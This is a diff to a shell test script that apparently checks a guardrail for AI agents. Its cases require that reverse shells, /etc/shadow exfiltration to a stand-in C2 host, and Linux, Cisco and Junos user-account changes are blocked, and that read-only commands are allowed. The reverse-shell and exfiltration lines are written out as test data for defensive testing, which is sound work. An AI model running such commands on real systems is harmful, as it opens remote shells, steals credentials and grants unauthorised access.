@@ -95,6 +95,14 @@ chk "OUT: /etc/shadow exfil to C2"          block "$(inspect_tool curl 'curl --d
 chk "OUT: nc -e reverse shell"              block "$(inspect_tool nc 'nc -e /bin/bash c2.canary.invalid 4444')"
 chk "OUT: bash /dev/tcp reverse shell"      block "$(inspect_tool bash 'bash -i >& /dev/tcp/c2.canary.invalid/4444 0>&1')"
 
+hdr "1b) Clawlab local user CRUD rules (inspect-tool API)"
+chk "OUT: useradd (Linux create)"           block "$(inspect_tool bash 'useradd harness_local_user')"
+chk "OUT: userdel (Linux delete)"           block "$(inspect_tool bash 'userdel harness_local_user')"
+chk "OUT: usermod (Linux update)"           block "$(inspect_tool bash 'usermod -aG wheel harness_local_user')"
+chk "OUT: Cisco username create"            block "$(inspect_tool bash 'username netadmin secret Cisco123!')"
+chk "OUT: Cisco no username delete"         block "$(inspect_tool bash 'no username netadmin')"
+chk "OUT: Junos login user create"          block "$(inspect_tool bash 'set system login user harness class super-user')"
+
 hdr "2) ssh-ops MCP read-only allowlist"
 chk "in-policy: run_command uptime"        allow "$(mcp_verdict 'uptime')"
 chk "in-policy: run_command df -h /"       allow "$(mcp_verdict 'df -h /')"
